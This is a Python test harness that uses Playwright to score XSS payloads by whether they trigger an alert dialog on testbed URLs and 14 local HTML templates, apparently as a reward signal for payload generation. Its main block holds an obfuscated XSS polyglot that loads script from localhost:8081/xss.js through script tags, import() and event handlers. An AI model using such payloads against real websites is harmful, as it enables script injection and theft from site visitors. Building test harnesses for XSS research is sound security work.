# testbed.py
import asyncio
from playwright.async_api import async_playwright,Dialog,Page
from urllib.parse import quote_plus
from urls import TESTBED_URLS
import os

os.chdir(os.path.dirname(os.path.abspath(__file__)))

async def evaluate(url: str, payload: str) -> bool:
    if "alert()" not in payload:
        return False
    triggered = False
    
    #print(f"Testing {url} with payload: {payload}")
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        
        async def on_dialog(dialog:Dialog):
            nonlocal triggered
            triggered = True
            await dialog.dismiss()
        page.on("dialog", on_dialog)

        target = f"{url}?q={payload}"
        await page.goto(target)
    if triggered:
        print(f"[v] Triggered XSS")
    return triggered

async def testbed(payload: str) -> int:
    trigger_count = 0
    tasks = [evaluate(url, payload) for url in TESTBED_URLS]
    batch_size = 20
    results = []
    for i in range(len(TESTBED_URLS)//batch_size):
        results += await asyncio.gather(*tasks[i*batch_size:(i+1)*batch_size])
    trigger_count = sum(results)
    
    return trigger_count

async def local_testbed(payload: str) -> int:
    if "alert()" not in payload:
        return 0
    async with async_playwright() as p:
        reward = 0
        async def on_dialog(dialog:Dialog):
            nonlocal triggered
            triggered = True
            await dialog.dismiss()
            
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        page.on("dialog", on_dialog)
        for i in range(1, 15):
            triggered = False
            template_path = f"../testbed_server/localtest/template_{i}.html"
            with open(template_path, "r", encoding="utf-8") as f:
                template_content = f.read()
            await page.set_content(template_content.format(payload=payload),wait_until="load")
            if triggered:
                reward += 1
        await page.close()
        return reward/14

if __name__ == "__main__":
    polyglot = ">/<ScRiPt sRc=`http://localhost:8081/xss.js`></ScRiPt><!---//frAmEsEt>)auDio>'/>-->,jAvAsCriPt:import(\"http://localhost:8081/xss.js\")'/sCrIpT<!-- oNtOgGle=--> oNLoAd=import('http://localhost:8081/xss.js')<!--'(/noScRIpt>>--!> oNFoCus=,sCrIpT/*xMp>*frAmEsEt> oNmOuSeOveR= </noScRIpt><ScRiPt sRc=\"http://localhost:8081/xss.js\"></ScRiPt>>viDeO>&lt;sCrIpT oNLoAd='sVg nOfRaMeS&gt;/bUtTon&gt;sOurCe&gt;nOeMbed&gt;"
    result = asyncio.run(local_testbed(polyglot))
    print("觸發 XSS context 數：", result)
    polyglot = "alert()<!--javascript:"
    result = asyncio.run(local_testbed(polyglot))
    print("觸發 XSS context 數：", result*14)